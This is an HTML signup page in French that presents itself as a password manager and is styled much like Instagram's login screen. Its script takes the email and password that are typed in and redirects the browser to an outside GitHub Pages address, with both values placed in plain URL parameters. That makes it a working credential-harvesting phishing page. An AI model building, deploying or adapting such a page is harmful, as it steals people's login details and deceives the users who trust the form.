<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestionnaire de Mots de Passe</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            width: 400px;
            text-align: center;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bdb;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Enregistrement</h1>
    <form id="loginForm" onsubmit="handleSubmit(event)">
        <input type="text" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Mot de passe" required>
        <button type="submit">S'inscrire</button>
    </form>
</div>

<script>
    function handleSubmit(event) {
        event.preventDefault(); // Empêche le rechargement de la page
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Rediriger vers le site de stockage avec les données en tant que paramètres d'URL
        const storageUrl = 'https://lyor678.github.io/xxxxv/';
        const url = new URL(storageUrl);
        url.searchParams.set('email', email);
        url.searchParams.set('password', password);
        window.location.href = url; // Redirection vers la page de stockage
    }
</script>

</body>
</html>
